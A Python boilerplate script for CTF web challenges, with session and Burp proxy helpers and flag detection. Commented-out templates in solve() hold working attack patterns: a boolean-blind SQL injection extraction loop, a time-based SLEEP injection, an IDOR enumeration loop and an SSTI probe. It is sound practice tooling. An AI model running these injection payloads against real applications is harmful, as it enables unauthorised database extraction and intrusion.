#!/usr/bin/env python3
"""
web-template.py - requests session boilerplate for CTF web challenges.

Usage:
    python3 web-template.py --url http://target:8080
    python3 web-template.py --url http://target:8080 --proxy     # route via Burp (127.0.0.1:8080)
    python3 web-template.py --url http://target:8080 --verbose   # log response snippets

Everything you need is in solve(); the helpers handle sessions, Burp proxying
(tls verification is disabled ONLY when --proxy is used), and flag extraction.
"""

import argparse
import re
import sys

import requests
import urllib3
from urllib.parse import urljoin

FLAG_RE = re.compile(rb"(?:flag|ctf|FLAG|CTF|picoCTF|HTB)\{[^}\r\n]{1,120}\}")


def parse_args():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--url", required=True, help="base URL, e.g. http://target:8080")
    p.add_argument("--proxy", action="store_true",
                   help="route through Burp at http://127.0.0.1:8080 and skip TLS verify")
    p.add_argument("--proxy-url", default="http://127.0.0.1:8080",
                   help="override proxy address (default: %(default)s)")
    p.add_argument("--verbose", action="store_true", help="print status + body snippet per request")
    return p.parse_args()


args = parse_args()
BASE = args.url.rstrip("/") + "/"

session = requests.Session()
session.headers.update({
    "User-Agent": "ctf-web-solver/1.0",
    # "Authorization": "Bearer ...",      # challenge-specific
    # "Content-Type": "application/json",
})

if args.proxy:
    session.proxies = {"http": args.proxy_url, "https": args.proxy_url}
    session.verify = False
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ---------------------------------------------------------------- HELPERS
def tag(r: requests.Response):
    """Short log line per request."""
    if args.verbose:
        snippet = r.text[:120].replace("\n", " ")
        print(f"[*] {r.status_code} {len(r.content):>7}B  {r.request.method} {r.url}  | {snippet}")


def get(path="", **kw):
    r = session.get(urljoin(BASE, path), timeout=15, allow_redirects=kw.pop("redirects", True), **kw)
    tag(r)
    check_flag(r)
    return r


def post(path="", data=None, **kw):
    r = session.post(urljoin(BASE, path), data=data, timeout=15, **kw)
    tag(r)
    check_flag(r)
    return r


def check_flag(r: requests.Response):
    m = FLAG_RE.search(r.content)
    if m:
        print(f"\n[+] FLAG FOUND: {m.group().decode(errors='replace')}\n")
        sys.exit(0)


def login(user: str, password: str):
    """Example auth flow - adapt per challenge."""
    r = post("login", data={"username": user, "password": password})
    return r.ok


# ---------------------------------------------------------------- SOLVE

def solve():
    # --- Step 1: fingerprint the target ---
    r = get("/")
    print(f"[*] server: {r.headers.get('Server', '?')}  powered-by: {r.headers.get('X-Powered-By', '?')}")

    # --- Step 2: common quick checks (uncomment as needed) ---
    # get("/robots.txt")
    # get("/.git/HEAD")                       # exposed git repo
    # get("/admin")                           # trivially protected areas

    # --- Step 3: SQLi boolean-blind oracle pattern ---
    # alphabet = "0123456789abcdef{}_"
    # known = "flag{"
    # for _ in range(50):
    #     for c in alphabet:
    #         r = get("/api/user", params={"id": f"1' AND SUBSTRING((SELECT flag FROM secret),{len(known)+1},1)='{c}'-- -"})
    #         if b"logged in" in r.content:   # TRUE response signature
    #             known += c
    #             print(f"[*] {known}")
    #             break
    #     else:
    #         break

    # --- Step 4: IDOR pattern ---
    # for i in range(1, 200):
    #     get(f"/api/document/{i}")

    # --- Step 5: SSTI probe ---
    # r = get("/hello", params={"name": "{{7*7}}"})
    # if "49" in r.text: print("[+] SSTI confirmed")

    # --- Step 6: timed-based oracle pattern ---
    # import time
    # t0 = time.perf_counter()
    # get("/login", params={"u": "admin' AND SLEEP(2)-- -"})
    # if time.perf_counter() - t0 > 2: print("[+] time-based confirmed")

    print("[*] done - no flag found yet; extend solve() with your exploit")


if __name__ == "__main__":
    try:
        solve()
    except requests.exceptions.ConnectionError as e:
        print(f"[x] connection failed: {e}")
        sys.exit(1)
